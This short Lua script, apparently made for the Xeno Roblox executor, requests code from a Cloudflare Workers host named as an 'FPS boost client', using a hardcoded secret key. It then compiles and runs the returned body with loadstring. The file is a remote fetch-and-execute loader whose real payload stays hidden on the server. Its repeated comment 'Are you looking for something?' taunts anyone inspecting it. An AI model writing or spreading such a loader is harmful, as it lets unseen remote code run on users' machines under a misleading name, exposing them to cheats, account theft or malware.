-- Are you looking for something?
local proxyUrl = "https://fpsboostclient.taskyield0.workers.dev" 

-- Are you looking for something?
local secretKey = "TaskYield0SecretKey" 

print("Attempting to connect to proxy...")

local response
local success, err = pcall(function()
    response = request({
        Url = proxyUrl,
        Method = "GET",
        Headers = {
            ["Authorization"] = "Bearer " .. secretKey
        }
    })
end)

-- Are you looking for something?
if not success then
    warn("Xeno failed to send the request: " .. tostring(err))
    return
end

-- Are you looking for something?
if response.StatusCode == 200 then
    print("Proxy hit successfully! Executing code...")
    
    local func, compileErr = loadstring(response.Body)
    if func then
        func() -- Are you looking for something?
    else
        warn("Xeno fetched the code, but failed to compile it. Check your raw GitHub link. Error: " .. tostring(compileErr))
    end
else
    -- Are you looking for something?
    warn("Proxy Blocked or Failed! Status Code: " .. tostring(response.StatusCode))
    warn("Cloudflare Message: " .. tostring(response.Body))
end
